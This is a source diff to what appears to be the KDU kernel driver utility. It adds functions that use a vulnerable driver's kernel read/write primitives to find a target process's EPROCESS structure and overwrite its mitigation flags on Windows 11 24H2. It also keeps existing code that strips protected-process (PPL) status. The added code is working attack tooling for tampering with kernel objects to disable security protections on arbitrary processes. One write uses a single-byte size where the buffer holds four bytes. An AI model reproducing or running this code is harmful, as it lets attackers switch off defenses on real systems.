@@ -252,7 +252,7 @@ BOOL KDURunCommandPPL(
         signer = PsProtectedSignerAntimalware;
         type = PsProtectedTypeProtectedLight;
     }
-    bResult = KDUControlProcess(Context, pi.dwProcessId, signer, type);
+    bResult = KDUControlProcessProtections(Context, pi.dwProcessId, signer, type);
     if (!bResult) {
         supShowWin32Error("[!] Failed to set process as PPL", GetLastError());
         return bResult;
@@ -286,7 +286,23 @@ BOOL KDUUnprotectProcess(
     _In_ PKDU_CONTEXT Context,
     _In_ ULONG_PTR ProcessId)
 {
-    return KDUControlProcess(Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
+    return KDUControlProcessProtections(Context, ProcessId, PsProtectedSignerNone, PsProtectedTypeNone);
+}
+
+/*
+* KDUUnmitigateProcess
+*
+* Purpose:
+*
+* Modify process object to remove process mitigations.
+*
+*/
+BOOL KDUUnmitigateProcess(
+    _In_ PKDU_CONTEXT Context,
+    _In_ ULONG_PTR ProcessId,
+    _In_ ULONG PsNewMitigations)
+{
+    return KDUControlProcessMitigationFlags2(Context, ProcessId, PsNewMitigations);
 }
 
 
@@ -319,15 +335,33 @@ VOID printProtection(
     printf_s("\tPsProtection->Audit: %lu\r\n", PsProtection->Audit);
 }
 
+
 /*
-* KDUControlProcess
+* printProtection
+*
+* Purpose:
+*
+* Print ProcessMitigationsFlags2 value.
+*
+*/
+VOID printMitigationFlags(
+	_In_ INT Index,
+    _In_ ULONG Buffer
+)
+{
+    // PS_MITIGATION* PsMitigation = (PS_MITIGATION*)&Buffer; // TODO parse?
+    printf_s("\tPsMitigationFlags%i: 0x%lX\r\n", Index, Buffer);
+}
+
+/*
+* KDUControlProcessProtections
 *
 * Purpose:
 *
 * Modify process object to remove PsProtectedProcess access restrictions.
 *
 */
-BOOL KDUControlProcess(
+BOOL KDUControlProcessProtections(
     _In_ PKDU_CONTEXT Context,
     _In_ ULONG_PTR ProcessId,
     _In_ PS_PROTECTED_SIGNER PsProtectionSigner,
@@ -437,7 +471,7 @@ BOOL KDUControlProcess(
                         if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                             VirtualAddress,
                             &verifyBuf,
-                            sizeof(UCHAR))) 
+                            sizeof(UCHAR)))
                         {
                             printf_s("[+] Kernel memory read at %p succeeded\r\n", (void *)VirtualAddress);
                             printf_s("\tNew PsProtection: 0x%02X\n", verifyBuf & 0xff);
@@ -472,4 +506,174 @@ BOOL KDUControlProcess(
     FUNCTION_LEAVE_MSG(__FUNCTION__);
 
     return bResult;
+}
+
+/*
+* KDUControlProcessMitigationFlags2
+*
+* Purpose:
+*
+* Modify process object to remove process MitigationFlags2. TODO merge with KDUControlProcessProtections?
+*
+*/
+BOOL KDUControlProcessMitigationFlags2(
+    _In_ PKDU_CONTEXT Context,
+    _In_ ULONG_PTR ProcessId,
+    _In_ ULONG PsNewMitigations)
+{
+    BOOL       bResult1 = FALSE;
+    BOOL       bResult2 = FALSE;
+    ULONG      Buffer1, Buffer2;
+    NTSTATUS   ntStatus;
+    ULONG_PTR  ProcessObject = 0, VirtualAddress1 = 0, VirtualAddress2 = 0, Offset1 = 0, Offset2 = 0;
+    HANDLE     hProcess = NULL;
+
+    CLIENT_ID clientId;
+    OBJECT_ATTRIBUTES obja;
+
+    FUNCTION_ENTER_MSG(__FUNCTION__);
+
+    InitializeObjectAttributes(&obja, NULL, 0, 0, 0);
+
+    clientId.UniqueProcess = (HANDLE)ProcessId;
+    clientId.UniqueThread = NULL;
+
+    ntStatus = NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION,
+        &obja, &clientId);
+
+    if (NT_SUCCESS(ntStatus)) {
+
+        printf_s("[+] Process with PID %llu opened (PROCESS_QUERY_LIMITED_INFORMATION)\r\n", ProcessId);
+        bResult1 = supQueryObjectFromHandle(hProcess, &ProcessObject);
+
+        if (bResult1 && (ProcessObject != 0)) {
+
+            printf_s("[+] Process object (EPROCESS) found, 0x%llX\r\n", ProcessObject);
+
+            switch (Context->NtBuildNumber) { // TODO: other versions
+            case NT_WIN8_BLUE:
+            case NT_WIN10_THRESHOLD1:
+            case NT_WIN10_THRESHOLD2:
+            case NT_WIN10_REDSTONE1:
+            case NT_WIN10_REDSTONE2:
+            case NT_WIN10_REDSTONE3:
+            case NT_WIN10_REDSTONE4:
+            case NT_WIN10_REDSTONE5:
+            case NT_WIN10_19H1:
+            case NT_WIN10_19H2:
+            case NT_WIN10_20H1:
+            case NT_WIN10_20H2:
+            case NT_WIN10_21H1:
+            case NT_WIN10_21H2:
+            case NT_WIN10_22H2:
+            case NT_WIN11_21H2:
+            case NT_WIN11_22H2:
+            case NT_WIN11_23H2:
+                break;
+            case NT_WIN11_24H2:
+                Offset1 = PsMitigationFlags1Offset_26100;
+                Offset2 = PsMitigationFlags2Offset_26100;
+                break;
+            default:
+                Offset1 = Offset2 = 0;
+                break;
+            }
+
+            if (Offset1 == 0 || Offset2 == 0) {
+
+                supPrintfEvent(kduEventError,
+                    "[!] Unsupported WinNT version\r\n");
+
+            }
+            else {
+
+                VirtualAddress1 = EPROCESS_TO_MITIGATIONFLAGS1(ProcessObject, Offset1);
+                VirtualAddress2 = EPROCESS_TO_MITIGATIONFLAGS2(ProcessObject, Offset2);
+
+                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS1, 0x%llX\r\n", VirtualAddress1);
+                printf_s("[+] EPROCESS->PS_MITIGATION_FLAGS2, 0x%llX\r\n", VirtualAddress2);
+
+                Buffer1 = Buffer2 = 0;
+
+                bResult1 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                    VirtualAddress1,
+                    &Buffer1,
+                    sizeof(ULONG));
+
+                bResult2 = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                    VirtualAddress2,
+                    &Buffer2,
+                    sizeof(ULONG));
+
+                if (bResult1 && bResult2)
+                {
+                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
+                    printMitigationFlags(1, Buffer1);
+                    printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
+                    printMitigationFlags(2, Buffer2);
+
+                    Buffer1 = Buffer2 = PsNewMitigations;
+
+                    bResult1 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
+                        VirtualAddress1,
+                        &Buffer1,
+                        sizeof(UCHAR));
+
+                    bResult2 = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
+                        VirtualAddress2,
+                        &Buffer2,
+                        sizeof(UCHAR));
+
+                    if (bResult1 && bResult2) {
+                        printf_s("[+] Process object modified\r\n");
+
+                        ULONG verifyBuf1 = 0;
+                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                            VirtualAddress1,
+                            &verifyBuf1,
+                            sizeof(UCHAR)))
+                        {
+                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress1);
+                            printMitigationFlags(1, verifyBuf1);
+                        }
+
+                        ULONG verifyBuf2 = 0;
+                        if (Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
+                            VirtualAddress2,
+                            &verifyBuf2,
+                            sizeof(UCHAR)))
+                        {
+                            printf_s("[+] Kernel memory read at %p succeeded\r\n", (void*)VirtualAddress2);
+                            printMitigationFlags(2, verifyBuf2);
+                        }
+
+                    }
+                    else {
+
+                        supPrintfEvent(kduEventError,
+                            "[!] Cannot modify process object\r\n");
+
+                    }
+                }
+                else {
+
+                    supPrintfEvent(kduEventError,
+                        "[!] Cannot read kernel memory\r\n");
+
+                }
+            }
+        }
+        else {
+            supPrintfEvent(kduEventError,
+                "[!] Cannot query process object\r\n");
+        }
+        NtClose(hProcess);
+    }
+    else {
+        supShowHardError("[!] Cannot open target process", ntStatus);
+    }
+
+    FUNCTION_LEAVE_MSG(__FUNCTION__);
+
+    return bResult1 && bResult2;
 }
